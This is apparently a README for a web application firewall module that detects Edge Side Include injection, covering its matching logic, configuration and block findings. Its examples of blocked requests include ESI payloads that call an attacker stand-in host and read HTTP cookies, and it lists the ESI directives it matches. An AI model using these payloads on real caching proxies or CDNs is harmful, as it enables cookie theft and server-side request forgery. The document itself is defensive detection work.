# ESI-Injection-Detect CMC

Detects Edge Side Include (ESI) injection payloads in attacker-controlled input.
ESI is a markup language processed by reverse proxies and CDN edge nodes (Varnish,
Squid, Akamai, Fastly) to assemble page fragments server-side.  When attacker input
reaches an ESI processor, directives like `<esi:include src="http://attacker/…"/>` can
exfiltrate cookies, probe the internal network, or execute SSRF payloads — entirely
transparent to the origin application.

---

## How it works

| Step | Detail |
|------|--------|
| **`<` scanning** | `memchr` finds every `<` in O(n) using SIMD on supported platforms. |
| **`<!--esi` check** | Immediately after each `<`, the detector checks for the literal `<!--esi` comment form. |
| **`<esi:` check** | After `<` (and an optional `/` for closing tags), optional whitespace, then `esi`, optional whitespace, then `:`, optional whitespace, the detector matches the keyword against the 13-entry directive table. |
| **Case-insensitive** | All comparisons use byte-level ASCII case folding (`<ESI:VARS>` = `<esi:vars>`). |
| **Whitespace-tolerant** | Spaces and tabs between `<`, `esi`, `:`, and the keyword are skipped (`< esi : include` is detected). |

### Recognised ESI directives

| Matched label | Directive |
|---------------|-----------|
| `<esi:include` | `<esi:include>` — external resource inclusion |
| `<esi:inline` | `<esi:inline>` — inline fragment definition |
| `<esi:debug` | `<esi:debug/>` — debug output |
| `<esi:vars` | `<esi:vars>` — variable interpolation |
| `<esi:remove` | `<esi:remove>` — content removal for non-ESI clients |
| `<esi:choose` | `<esi:choose>` — conditional block |
| `<esi:when` | `<esi:when>` — condition branch |
| `<esi:otherwise` | `<esi:otherwise>` — default branch |
| `<esi:try` | `<esi:try>` — error-handling block |
| `<esi:attempt` | `<esi:attempt>` — try body |
| `<esi:except` | `<esi:except>` — error handler |
| `<esi:comment` | `<esi:comment>` — ESI-only comment |
| `<esi:assign` | `<esi:assign>` — variable assignment |
| `<!--esi` | Comment form used to hide ESI from non-ESI-aware clients |

---

## Enabling the module

Add `ESI_injection_detect: true` to your CMC config file (default location
`conf/filter.yaml`) and load it with the `--cmc-load` flag:

```yaml
# conf/filter.yaml
CMC-Rules:
  SQLi_comments_detect: true
  Overflow_detect: true
  SSTI_detect: true
  SSI_injection_detect: true
  ESI_injection_detect: true
  CRLF_injection_detect: true
  Request_Smuggling_detect: true
  NOSQL_injection_detect: true
  XXE_attack_detect: true
  Anti_exposed_backup: true
```

Start the WAF:

```sh
krakenwaf \
  --no-tls \
  --listen 0.0.0.0:8443 \
  --upstream http://127.0.0.1:8080 \
  --cmc-load conf/filter.yaml
```

To disable, set the value to `false` or remove the line entirely.

---

## Detection finding

When a request is blocked the following structured finding is emitted (visible in
logs, the Prometheus `/metrics` endpoint, and the SQLite database):

| Field | Value |
|-------|-------|
| Title | `CMC ESI injection detection` |
| Severity | `High` |
| CWE | [CWE-94](https://cwe.mitre.org/data/definitions/94.html) — Improper Control of Generation of Code |
| Reference | [OWASP – Server-Side Includes Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) |
| `rule_match` | `cmc::esi_injection_detect:<matched-label>` |
| `rule_line_match` | `cmc/esi_injection_detect.rs:generated` |

---

## Examples

### Blocked requests

```
GET  /page?tmpl=<esi:include src="http://attacker.test/x" />   → 403   (<esi:include)
GET  /q=<ESI:VARS>$(HTTP_COOKIE)</ESI:VARS>                    → 403   (<esi:vars, upper-case)
POST /body=< esi : remove >x</esi:remove>                      → 403   (whitespace-tolerant)
GET  /x=<esi:try><esi:attempt>payload</esi:attempt></esi:try>  → 403   (<esi:try)
GET  /c=<!--esi <esi:include src="x" /> -->                    → 403   (<!--esi comment form)
```

### Allowed requests

```
GET  /page?name=hello                                           → forwarded   (no ESI)
GET  /article?tag=<b>bold</b>                                   → forwarded   (HTML, not ESI)
POST /data  body=<xml><item>value</item></xml>                  → forwarded   (XML, no esi:)
```

---

## False-positive guidance

The `esi:` namespace prefix is unique to the ESI specification and does not appear in
standard HTML, SVG, or XML vocabularies used in normal application traffic.
False positives are extremely rare.  If your application legitimately passes ESI
markup (e.g. an ESI authoring tool):

1. **Allow-path**: add the specific path to `rules/allowpaths/lists.yaml`.
2. **Disable the module**: set `ESI_injection_detect: false` in the CMC config.

---

## Performance notes

* `memchr` uses SIMD to locate `<` characters — cost is proportional to the
  distance between `<` occurrences, not total input length.
* Per `<` hit: constant-time check for `<!--esi`, then a short bounded walk through
  whitespace and up to 13 keyword comparisons.
* No heap allocation during scanning; the matched label is allocated only on match.

---

## Source files

| File | Purpose |
|------|---------|
| `src/cmc/esi_injection_detect.rs` | Detector implementation, directive table, unit tests |
| `src/cmc/mod.rs` | Module registration, `CmcConfig` field, `CmcManager` field, `inspect()` call |
| `src/waf/engine.rs` | Integration — `inspect()` called in the main WAF pipeline |
| `conf/filter.yaml` | Default config — `ESI_injection_detect: true` |
